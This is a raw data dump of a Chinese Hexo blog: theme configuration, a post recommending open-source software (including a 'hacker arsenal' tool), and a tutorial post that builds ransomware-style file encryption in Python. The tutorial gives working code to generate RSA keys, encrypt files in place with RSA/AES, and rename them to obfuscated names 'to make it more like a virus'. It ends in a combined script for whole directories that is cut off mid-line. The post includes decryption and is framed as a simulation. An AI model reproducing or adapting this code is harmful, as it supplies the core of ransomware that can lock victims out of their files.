volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>本文旨在收集实用、安全、免费、有趣的开源项目或软件。</p>","more":"<h3 id=\"Windows调优区\"><a href=\"#Windows调优区\" class=\"headerlink\" title=\"Windows调优区\"></a>Windows调优区</h3><ul>\n<li><strong><a href=\"https://github.com/hellzerg/optimizer\">Optimizer</a></strong></li>\n</ul>\n<p>堪称是Windows 系统上最好用的性能优化器！</p>\n<p align=\"center\" style=\"width:60%;\">\n   <img src=\"/2023/09/10/OpenSourceSofts/5.png\">\n</p>\n\n<ul>\n<li><strong><a href=\"https://github.com/wangshusen/SearchEngine\">SophiApp</a></strong></li>\n</ul>\n<p>一款强大的 Windows 微调工具。这是一个用于微调 Windows 10 和 Windows 11 配置的调整器。它拥有现代化的操作界面，在保证系统稳定的前提下，提供了超过 130 种的调整选项。</p>\n<p align=\"center\" style=\"width:60%;\">\n   <img src=\"/2023/09/10/OpenSourceSofts/6.png\">\n</p>\n\n<ul>\n<li><strong><a href=\"https://github.com/valinet/ExplorerPatcher\">ExplorerPatcher</a></strong></li>\n</ul>\n<p>自由切换Windows11 开始菜单样式的工具。这是一款能够让Windows 11 的开始菜单栏(Explorer) 重回Windows 10 样式的扩展工具，除此之外还支持禁用Windows 11 的上下文菜单和命令栏等功能，让你在Windows 上拥有更舒适的工作环境。</p>\n<ul>\n<li><strong><a href=\"https://github.com/henrypp/memreduct\">memreduct</a></strong></li>\n</ul>\n<p>内存自动优化清理，轻量级实时内存管理应用程序，用于监视和清理计算机上的系统内存。</p>\n<p align=\"center\" style=\"width:50%;\">\n    <img src=\"/2023/09/10/OpenSourceSofts/7.png\">\n</p>\n\n<h3 id=\"Windows实用区\"><a href=\"#Windows实用区\" class=\"headerlink\" title=\"Windows实用区\"></a>Windows实用区</h3><ul>\n<li><strong><a href=\"https://www.voidtools.com/zh-cn/\">Everything</a></strong></li>\n</ul>\n<p>本地文件搜索工具，属于本人装机必备的软件。</p>\n<p align=\"center\" style=\"width:40%;\">\n    <img src=\"/2023/09/10/OpenSourceSofts/8.png\">\n</p>\n\n<ul>\n<li><strong><a href=\"https://geekuninstaller.com/\">Geek</a></strong></li>\n</ul>\n<p>高效快速、小巧便携。100% 免费的Windows卸载工具，同时在卸载之后会自动清理注册表缓存，也属于我的装机必备软件。</p>\n<p align=\"center\" style=\"width:30%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/9.png\">\n</p>\n\n<ul>\n<li><strong><a href=\"https://potplayer.daum.net/\">potplayer视频播放器</a></strong></li>\n</ul>\n<p>本人一直在用的视频播放器软件，几乎是装机必备的软件，功能很强大，唯一的缺点是只支持Windows系统。</p>\n<p align=\"center\" style=\"width:50%;\">\n    <img src=\"/2023/09/10/OpenSourceSofts/10.png\">\n</p>\n\n<ul>\n<li><strong><a href=\"https://www.videolan.org/vlc/\">VLC视频播放器</a></strong></li>\n</ul>\n<p>VLC 是一款免费、自由、开源的跨平台多媒体播放器及框架，可播放大多数多媒体文件，以及各类流媒体协议。可在所有平台运行 - Windows, Linux, Mac OS X, Unix, iOS, Android…<br>本人在Ubuntu上就是用的这个。</p>\n<p align=\"center\" style=\"width:50%;\">\n    <img src=\"/2023/09/10/OpenSourceSofts/1.jpg\">\n</p>\n\n<ul>\n<li><strong><a href=\"https://mathewsachin.github.io/blog/2023/04/09/captura-unmaintained.html\">Captura</a></strong></li>\n</ul>\n<p>Captura是一款适用于 Windows 的屏幕捕获（屏幕截图、录制）应用程序，可以捕获屏幕、网络摄像头、音频和击键。它不再维护，但源代码仍然存档在 GitHub 上，有 8k+ star 和 1.5k+ fork。</p>\n<p align=\"center\" style=\"width:30%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/11.png\">\n</p>\n\n<ul>\n<li><strong><a href=\"https://github.com/InJeCTrL/ClickRun\">鼠标自动点击器（简单版）</a></strong> <strong><a href=\"https://github.com/taojy123/KeymouseGo\">鼠标自动点击器（高级版）</a></strong></li>\n</ul>\n<p>可以帮我们自动完成一些机械性重复的工作！</p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/3.png\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/screego/server/releases/tag/v1.10.0\">server</a></strong></li>\n</ul>\n<p>多用户的屏幕分享服务。它可以快速启动一个在线共享屏幕的服务，让用户无需安装任何软件，仅使用浏览器就能分享自己的屏幕画面。项目基于网页实时通信(WebRTC) 实现，由 STUN&#x2F;TURN 协议完成内网穿透和浏览器端对端的连接，既实用又有源码可以学习。</p>\n<p align=\"center\" style=\"width:50%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/12.png\">\n</p>\n\n<ul>\n<li><strong><a href=\"https://github.com/hiroi-sora/Umi-OCR\">Umi-OCR</a></strong></li>\n</ul>\n<p>OCR图片转文字识别软件，完全离线。截屏&#x2F;批量导入图片，支持多国语言、合并段落、竖排文字。可排除水印区域，提取干净的文本。基于 PaddleOCR 。基于 PaddleOCR 的 OCR 图片转文字识别软件。完全免费、可离线使用的开源软件，支持截屏识别文字、批量导入图片、横&#x2F;竖排文字，还可以自动忽略水印区域，适用于 Win10、Win11 操作系统。</p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/13.png\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://gopeed.com/zh-CN\">Gopeed</a></strong></li>\n</ul>\n<p>一款支持全平台的下载器。</p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/2.jpg\">\n</div>\n\n<h3 id=\"Windows工作区\"><a href=\"#Windows工作区\" class=\"headerlink\" title=\"Windows工作区\"></a>Windows工作区</h3><ul>\n<li><strong><a href=\"https://handbrake.fr/\">视频压缩神器</a></strong></li>\n</ul>\n<p>HandBrake 是一款由志愿者构建的开源工具，用于将视频从几乎任何格式转换为一系列广泛支持的现代编解码器。转换几乎任何格式的视频，免费和开源多平台（Windows、Mac 和 Linux）。</p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/3.jpg\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/didi/LogicFlow/\">LogicFlow</a></strong></li>\n</ul>\n<p>是一款流程图编辑框架，提供了一系列 流程图的交互、编辑所必需的功能和简单灵活的节点自定义、插件等拓展机制，方便我们快速在业务系统内满足类流程图的需求。</p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/2.gif\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/boy1dr/SpleeterGui\">SpleeterGui</a></strong></li>\n</ul>\n<p>一款Windows 上的音轨分离工具，它是第三方制作的Spleeter 桌面应用，支持中文在内的多国语言，可以将音乐里的人声和乐器声分离，轻松实现提取音乐中的伴奏。</p>\n<div align=\"center\" style=\"width:40%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/14.png\">\n</div>\n\n<h3 id=\"Windows娱乐区\"><a href=\"#Windows娱乐区\" class=\"headerlink\" title=\"Windows娱乐区\"></a>Windows娱乐区</h3><ul>\n<li><strong><a href=\"https://github.com/rocksdanister/lively\">lively</a></strong></li>\n</ul>\n<p>Windows 动态桌面壁纸工具。支持 Windows 用户设置多种动画文件为桌面壁纸的工具，不仅安装简单效果炫酷，而且完全免费。</p>\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/4.jpg\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/jellyfin/jellyfin\">jellyfin</a></strong></li>\n</ul>\n<p>这是一款非常优秀的本地媒体库管理工具。完全免费、支持中文、安装简单、跨平台、功能强大的媒体库管理系统。它能把原本躺在文件夹里的视频文件，变成包含封面、描述、评分、演员表等信息的“影碟”，让视频整整齐齐、赏心悦目，还支持视频续播、订阅更新、多端可看，让你可以远离广告优雅地追剧。</p>\n<ul>\n<li><strong><a href=\"https://github.com/kovidgoyal/calibre\">calibre</a></strong></li>\n</ul>\n<p>一款完全免费开源且功能强大的电子书管理工具。它是集下载、格式转化、制作、管理于一体的电子书工具，比如可以将 txt 文本，转化成包含作者信息和书籍封面的 mobi 文件，制作完成后还可以直接发送到 Kindle 设备上。 支持多种电子书格式，包括EPUB、MOBI、PDF等等。Calibre的功能非常强大，可以帮助用户轻松地管理自己的电子书库，包括添加、删除、重命名和搜索等。此外，它还提供了阅读器功能，用户可以在软件内直接阅读电子书，而不需要另外下载阅读器。你还可以可通过插件&#x2F;扩展实现更多的功能。</p>\n<h3 id=\"极客区\"><a href=\"#极客区\" class=\"headerlink\" title=\"极客区\"></a>极客区</h3><ul>\n<li><strong><a href=\"https://github.com/Z4nzu/hackingtool\">hackingtool</a></strong></li>\n</ul>\n<p>黑客工具全家桶。该项目收录了各种黑客工具，包括破解密码、SQL 注入、钓鱼攻击、XSS、DDos 等。堪称黑客军火库的开源项目啊</p>\n<div align=\"center\" style=\"width:70%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/15.png\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/RocketChat/Rocket.Chat\">Rocket.Chat</a></strong></li>\n</ul>\n<p>一款可自由定制的企业级开源通信平台源码。用它来可以搭建一个功能丰富的通信平台，可自托管做为 Slack 的开源替代品。支持创建频道、团队和讨论等多种不同功能的群聊，消息支持图片、文件、视频和语音，拥有包括 Windows、Linux、macOS、Android 和 iOS 在内的多种客户端。 如果你需要搭建一个安全加密，且具有高度私密性的通信平台，那么这款开源项目就非常适合你了。</p>\n<div align=\"center\" style=\"width:70%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/1.webp\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/Mereithhh/vanblog\">vanblog</a></strong></li>\n</ul>\n<p>实用的一站式个人博客系统。一款简洁优雅的博客系统，追求极致响应速度和博客体验。快到极致的响应速度，Lighthouse 接近满分。前后台均为响应式，支持 Docker 一键部署。前台为静态页面并支持增量渲染，按需构建更新页面。拒绝花里胡哨的功能，专注于个人博客场景。</p>\n<p><a href=\"https://vanblog.mereith.com/guide/get-started.html\">vanblog快速上手</a></p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/16.png\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://www.hwinfo.com/\">HWiNFO </a></strong></li>\n</ul>\n<p>适用于 Windows 和 DOS 的全面硬件分析、监控和报告。坦白说，是一个计算机硬件监测工具，并且可以生成报告保存、最全面的系统审计工具。受到了NASA、AMD、华硕、因特尔、戴尔、技嘉等厂商的一致认可。</p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/5.jpg\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://crystalmark.info/en/software/crystaldiskmark/\">crystaldiskmark</a></strong></li>\n</ul>\n<p>CrystalDiskMark 是一款简单的磁盘基准测试软件。</p>\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/4.png\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/1Panel-dev/1Panel\">1Panel</a></strong></li>\n</ul>\n<p>现代化、开源的 Linux 服务器运维管理面板</p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/17.png\">\n</div>\n\n<h3 id=\"安卓应用区\"><a href=\"#安卓应用区\" class=\"headerlink\" title=\"安卓应用区\"></a>安卓应用区</h3><ul>\n<li><strong><a href=\"https://github.com/organicmaps/organicmaps\">organicmaps</a></strong></li>\n</ul>\n<p>一款免费、没广告的离线地图应用。适用于旅行者、游客、徒步旅行者和骑行者的Android 和iOS 离线地图应用，它使用OpenStreetMap 数据，支持详细的离线地图、骑行路线、语音导航、等高线、海拔剖面、山峰和坡度等功能。</p>\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/2.png\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/Sangwan5688/BlackHole\">BlackHole</a></strong></li>\n</ul>\n<p>一款高颜值的音乐播放器应用。该项目是用 Flutter 写的高颜值、无广告、免费音乐播放器，拥有歌词、专辑、艺术家、播放列表、定时关闭等功能，支持 Android、iOS、macOS 系统。</p>\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/1.png\">\n</div>\n\n<h3 id=\"高阶AI区\"><a href=\"#高阶AI区\" class=\"headerlink\" title=\"高阶AI区\"></a>高阶AI区</h3><ul>\n<li><strong><a href=\"https://github.com/PetoiCamp/OpenCat\">OpenCat</a></strong></li>\n</ul>\n<p>开源的四足机器人宠物框架源码，这是一个基于Arduino 和Raspberry Pi 的四足机器人宠物框架，让你可通过C&#x2F;C++&#x2F;Python 编程语言操控四足机器人。该公司生产的迷你机器猫，神似玩具版的波士顿机械狗。</p>\n<ul>\n<li><strong><a href=\"https://github.com/microsoft/Bringing-Old-Photos-Back-to-Life\">Bringing-Old-Photos-Back-to-Life</a></strong></li>\n</ul>\n<p>通过深度学习修复老照片的工具，由微软开源的深度学习项目，可用于修复破损的老照片，修复效果显著。</p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/6.jpg\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/Tohrusky/Final2x/\">Final2x</a></strong></li>\n</ul>\n<p>图片放大工具，免费开源，主要是清晰度会提高。</p>\n<div align=\"center\" style=\"width:40%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/18.png\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/facebookresearch/AnimatedDrawings\">AnimatedDrawings</a></strong></li>\n</ul>\n<p>让画作动起来的AI 项目。这是Meta AI 研究院开源的动画库，它能让你的画作动起来。无论是小朋友画的小人，还是高水平的卡通人物，该项目都能让它们跟着你一起做动作。</p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/1.gif\">\n</div>\n\n<h3 id=\"不正经项目区\"><a href=\"#不正经项目区\" class=\"headerlink\" title=\"不正经项目区\"></a>不正经项目区</h3><ul>\n<li><strong><a href=\"https://github.com/DukeLuo/wai\">Wai</a></strong></li>\n</ul>\n<p>一款可以预防颈椎病的项目。这是一个通过非正常的方式，展示历史上的今天和这个季节吃什么果蔬的内容，“强迫”你活动脖子从而实现预防颈椎病的目的。</p>"},{"title":"使用Python加密文件","date":"2023-04-17T14:03:13.000Z","_content":"\n### 功能\n\n用Python实现对文件的加密和解密，即ransomware的代码原理实现。\n\n### 序\n\n如果你是直接copy的代码块，粘贴到pycharm后，你会看到.py文件会有一些导入包的报错。你可以自己去网上找教程进行下载。<!-- more -->比如[这个](https://blog.csdn.net/yilovexing/article/details/104011199)，也可以下载[我提供的文件](https://www.aliyundrive.com/s/HcrQHfdUYMi)，然后把下载两个文件夹复制到Python环境的`F:\\Python\\Lib\\site-packages\\`文件夹下面（我的Python安装在F盘，找到你自己的安装路径），这个文件夹保存了一些Python导的包。如果是自己下载的，下载完之后还是报错，也可以到这个文件夹下，检查一下Python中导包时from XXX和下载到这个文件夹的包命大小写是否一致。再有别的问题，也只能你自己去探索了。我百分之百确定，这个代码是可以运行成功的。我用的Python版本是3.11.2。\n\n### 秘钥生成\n\n准备好环境之后，那么我们现在来开始模拟hacker对文件进行加密处理吧！！\n\n如果前面有了解RSA算法的话，那么肯定知道，我们第一步就是要生成公钥和私钥，用公钥对文件进行加密，用私钥对文件进行解密。\n\n```bash 折叠代码\nfrom Crypto.PublicKey import RSA\n\n\ndef CreateRSAKeys():\n    code = 'nooneknows'\n    # 生成 2048 位的 RSA 密钥\n    key = RSA.generate(2048)\n    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection=\"scryptAndAES128-CBC\")\n    # 生成私钥\n    with open('zmy_rsa', 'wb') as f:\n        f.write(encrypted_key)\n    # 生成公钥\n    with open('zmy_rsa.pub', 'wb') as f:\n        f.write(key.publickey().exportKey())\n\n\nCreateRSAKeys()\n\n```\n\n当我们执行CreateRSAKeys()后，会在当前目录生成公钥和私钥，我们打开看看。\n\n公钥：\n\n```bash\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0j/abkXy6WLfwkacyKK3\n40Sk0dQkODmb6ej5sffzkfgSDOd18drt6vWuqzcH0dtBHcbr8a35K8mLr9WwdKYC\nhDj/dMQm+lOApmLmGeSwjoFB5Nj/tboBPRvPO0erxzS0jrtMdM6KbWjQMc4dkuuq\nIc/L6/Yp5l2mq3K3rdbkbZ8cKvJb5HCUeNiwNZQMTdxFd0R0qmVzezJdunFQAOiP\nG8Knod/Z1ZghETOEuM2OPXxlRs0KA9OQhMFRS6UmCRRNv29/srT/+M307W0U9GJL\n3Eobz6HqTlvl0g54Y9Dg84UO2t2VRgAZ3mlQa+bARyboOQwWpt3VZ7y44KqTwj90\nUQIDAQAB\n-----END PUBLIC KEY-----\n```\n\n私钥：\n\n```bash 折叠代码\n-----BEGIN ENCRYPTED PRIVATE KEY-----\nMIIFJTBPBgkqhkiG9w0BBQ0wQjAhBgkrBgEEAdpHBAswFAQIYFPAcEnz9NUCAkAA\nAgEIAgEBMB0GCWCGSAFlAwQBAgQQV9WQuQ24VS4bv3+pL+lm3ASCBNBw9SW3QVpT\nIgTS6uoi7HqXmI1eJW2YTz+SxPxQbTaS0fSPG21JoumOqYIzNoQ970fefOPiwiNB\nUuW46O9y/lGq3plisy9rKxmFNxjos5Dk3BBM/mOEAc5FS9i/PfKkExgCsIZ9eLpi\nwYt3n1myGJifopjmbjYd6ztHs+wOfyVtid87f+gYusSXk3Ne4Yn2FXqSOL3qKBTa\nPVB/Go/DfT3d50OghNC2x2WpVb69dXH68KqEIQEmCEU9QR9efOyD8DzggWMAPdAR\n1qJpSGIAtAf/vFV4QG+eFtZanzg3PywoRHkEaLo5CJbQb0K/5QaLFM7SE4iHecAI\nTZAepi92T1bCa0eyDUFf/RU0mgISrwzfpDzrxgnXjP3ksmLPDrCocXn2Kenvrnqv\nmrHwh3d4Y8qoCGEwtPuc3t1N5nNq7cd1BWhtt1E/scAp3B4pg6f3hPuWApXKzGwK\n1ru6RJrZ/yhvMTsXX7fASpKnUcJw20fOl5jqsNae0GufZnRTmEwjXzh5uyh7oKYx\nha2OycJWcaZTm6Yo6h7OfAAZfvWgT0sSg7q2Rw/v13laxAZFHlWwLek1L9vtOjXM\nRU/WSJxksg42WUWlL1EOF+GYsX5hwXEGpHNLJmkbeAWblx7xYvlYkkognhbAG/Pe\n2QJwbbhfFmQO3NSj8usT+3f0YpPodPXvprk6qosLnhPBjK/NYxYuI/PsRME6Jm02\nvQWgSB34vPS2NtxEt2WEtRSGAgwsLPo1U8GaGLLe5DCbXUbbm01/rd24VqY4I3fk\nhY8tw6V5PmBvJ3RlD4Q7xSdHTQnU05sDBg3WJ+gU4uNMYQxzs/2UxyRJfd7gHwt8\nJ4enD1ch0G1v5KeXRJNj2AatL8U3oSqm+4ZPzT/riRLB485yCljUwxFK18O2Rgy3\npurKYfk3Vh+M4UTVdmvOlNzaY7ll/kKGAeIz1CMBiyBDm3n0GOrTUT+UtMKgib6V\nXP6fVZ3A33oa2+cbaRX+4inShyNFly+FTjebHZ3qOBoKv9yJ2ZkeSwWhocpfZyG1\nLBidZFC6cKlzAuOalKAnk+FpkNAms7VBppjSZUiULqOdFbiJREN8tlVumQh4rNkm\nehaHywx1KYQxhi1wKoD5eqKhgjiIdGja9ojxXbS1QMZJhz5W7/uSvfLxXQrL4F6T\nZxwdF+w85+SJQq6d4MmLjyIDbdivsNg+m1t3kiaRRcVgBotFgT0qLVdqmB/Townt\naYnDBCJ6EgnWSGwNMqMOR9wwIp9x01UbMpM8r86DDmQlLKDh+oqi4WAdYoAgAt+5\n7Wwb45GsrgaX6YrQ42W364wsYsJSLkcrx2XuL221pZgm4wCxrKQ0LvpJ3zkrKLLF\nIiB2UEpKG02MmBHpUktS0P9WE3uLg11LlGMAjY785EcU5is8RIiJwWmsw31mI1aV\n/RXEdAk//2796uxxOjqoEYfieeIW8qlfiBRkxDRTqaFxlPqGm6HGs3xxIsKkylWX\nAjvyWUObRYcu8iujiCnOpCLiYUtfkxomiw0xl6hyqyLeVe0Vf6f/cTEKYRDfUpVS\n+Znqj5IfgE/7mqDl2rjH8SnsvBb2BMK/kMGjPuOIDFfbaXy+s9f9bGH6I/g2D57W\nG5V6ZnooEecwqjFhZ1xHKMtvDcPAO0ivEw==\n-----END ENCRYPTED PRIVATE KEY-----\n```\n\n当然每次运行的结果都不一定，公钥是公开的，任何人都可以看到，但是私钥一定要保存好，否则一旦泄露，意味着你的信息也不安全了。\n\n### 文件加密\n\n现在我们来看看如何对文件进行加密处理：\n\n```bash 折叠代码\nfrom Crypto.Cipher import AES, PKCS1_OAEP\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Random import get_random_bytes\n\n\ndef Encrypt(filename):\n    data = ''\n    # 二进制只读打开文件，读取文件数据\n    with open(filename, 'rb') as f:\n        data = f.read()\n    with open(filename, 'wb') as out_file:\n        # 收件人秘钥 - 公钥\n        recipient_key = RSA.import_key(open('zmy_rsa.pub').read())\n        # 一个 16 字节的会话密钥\n        session_key = get_random_bytes(16)\n        # Encrypt the session key with the public RSA key\n        cipher_rsa = PKCS1_OAEP.new(recipient_key)\n        out_file.write(cipher_rsa.encrypt(session_key))\n        # Encrypt the data with the AES session key\n        cipher_aes = AES.new(session_key, AES.MODE_EAX)\n\n        ciphertext, tag = cipher_aes.encrypt_and_digest(data)\n        out_file.write(cipher_aes.nonce)\n        out_file.write(tag)\n        out_file.write(ciphertext)\n\n\nEncrypt(\"e://test/music.mp3\")\n\n```\n\n我们打开一个文件用于写入数据。接着我们导入公钥赋给一个变量，创建一个 16 字节的会话密钥。在这个例子中，我们将使用混合加密方法，即 PKCS#1 OAEP ，也就是最优非对称加密填充。这允许我们向文件中写入任意长度的数据。接着我们创建 AES 加密，要加密的数据，然后加密数据。我们将得到加密的文本和消息认证码。最后，我们将随机数，消息认证码和加密的文本写入文件。\n\n加密后，这个时候你肯定没有办法按照原来的方式打开你的文件了，或者你能打开，显示的也是乱码。\n\n### 私钥解密\n\n```bash 折叠代码\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import AES, PKCS1_OAEP\n\n\ndef Descrypt(filename):\n    code = 'nooneknows'\n    with open(filename, 'rb') as fobj:\n        # 导入私钥\n        private_key = RSA.import_key(open('zmy_rsa').read(), passphrase=code)\n        # 会话密钥， 随机数，消息认证码，机密的数据\n        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)\n                                                   for x in (private_key.size_in_bytes(),\n                                                             16, 16, -1)]\n        cipher_rsa = PKCS1_OAEP.new(private_key)\n        session_key = cipher_rsa.decrypt(enc_session_key)\n        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n        # 解密\n        data = cipher_aes.decrypt_and_verify(ciphertext, tag)\n\n    with open(filename, 'wb') as wobj:\n        wobj.write(data)\n\n\nDescrypt(\"e://test/music.mp3\")\n\n```\n\n我们先以二进制模式读取我们的加密文件，然后导入私钥。注意，当你导私钥时，需要提供一个密码，否则会出现错误。然后，我们文件中读取数据，首先是加密的会话密钥，然后是 16 字节的随机数和 16 字节的消息认证码，最后是剩下的加密的数据。\n\n接下来我们需要解密出会话密钥，重新创建 AES 密钥，然后解密出数据。\n\n解密完成后，我们会发现刚刚打不开或者无法正确显示的文件，又恢复正常了！\n\n### 变更文件名\n\n当然至此，文件加密的部分已经完成，但是为了使这个更像病毒，我们可以模拟hacker的做法，直接把整个文件的后缀名改掉，或者更混蛋一点，我就是想搞破坏，直接把文件名字改成一串没有意义的数值：\n\n举例比如：blog2.rar ==> yFmcuIzZvxmY.liuxp\n\n```bash 折叠代码\nimport os\nimport base64\n\n\ndef RenameFile(dir, filename):\n    filename_bytes = filename.encode('utf-8')\n    filename_bytes_base64 = base64.encodebytes(filename_bytes)\n\n    filename_bytes_base64 = filename_bytes_base64[::-1][1:]  # 倒序\n    new_filename = filename_bytes_base64.decode('utf-8') + '.liuxp'\n\n    # print (new_filename)\n    print(os.path.join(dir, filename))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, filename), os.path.join(dir, new_filename))\n\n\nRenameFile(\"e:/test/\", \"cool.png\")\n\n```\n\n使用了base64对文件名进行编码。\n\n### 恢复文件名\n\n举例比如: yFmcuIzZvxmY.liuxp ==> blog2.rar\n\n```bash 折叠代码\nimport os\nimport base64\n\n\ndef RestoreFilename(dir, filename):\n    f = filename\n    filename = filename[::-1][6:][::-1]\n    filename_base64 = filename[::-1] + '\\n'\n    filename_bytes_base64 = filename_base64.encode('ascii')  # encode as ASCII\n    ori_filename = base64.decodebytes(filename_bytes_base64).decode('utf-8')\n    new_filename = ori_filename\n\n    # print(new_filename)\n    print(os.path.join(dir, f))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, f), os.path.join(dir, new_filename))\n\n\nRestoreFilename(\"e://test/\", \"0hHdu8GbsVGa.liuxp\")\n\n```\n\n使用了base64对文件进行解码。\n\n### 完整源码\n\n我们把上述几个过程整合起来，然后实现对某一个目录下的所有文件进行不对称加密和不对称解密：\n\n```bash 折叠代码\n# coding=utf-8\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Cipher import AES, PKCS1_OAEP\nimport os\nimport base64\n\n\ndef CreateRSAKeys():\n    code = 'nooneknows'\n    key = RSA.generate(2048)\n    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection=\"scryptAndAES128-CBC\")\n    # 私钥\n    with open('zmy_rsa', 'wb') as f:\n        f.write(encrypted_key)\n    # 公钥\n    with open('zmy_rsa.pub', 'wb') as f:\n        f.write(key.publickey().exportKey())\n\n\ndef Encrypt(filename):\n    data = ''\n    with open(filename, 'rb') as f:\n        data = f.read()\n    with open(filename, 'wb') as out_file:\n        # 收件人秘钥 - 公钥\n        recipient_key = RSA.import_key(open('zmy_rsa.pub').read())\n        session_key = get_random_bytes(16)\n        # Encrypt the session key with the public RSA key\n        cipher_rsa = PKCS1_OAEP.new(recipient_key)\n        out_file.write(cipher_rsa.encrypt(session_key))\n        # Encrypt the data with the AES session key\n        cipher_aes = AES.new(session_key, AES.MODE_EAX)\n        ciphertext, tag = cipher_aes.encrypt_and_digest(data)\n        out_file.write(cipher_aes.nonce)\n        out_file.write(tag)\n        out_file.write(ciphertext)\n\n\ndef Descrypt(filename):\n    code = 'nooneknows'\n    with open(filename, 'rb') as fobj:\n        # 导入私钥\n        private_key = RSA.import_key(open('zmy_rsa').read(), passphrase=code)\n        # 会话密钥， 随机数，消息认证码，机密的数据\n        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)\n                                                   for x in (private_key.size_in_bytes(),\n                                                             16, 16, -1)]\n        cipher_rsa = PKCS1_OAEP.new(private_key)\n        session_key = cipher_rsa.decrypt(enc_session_key)\n        cipher_aes = AES.new(session_key, AES.MODE_EAX, 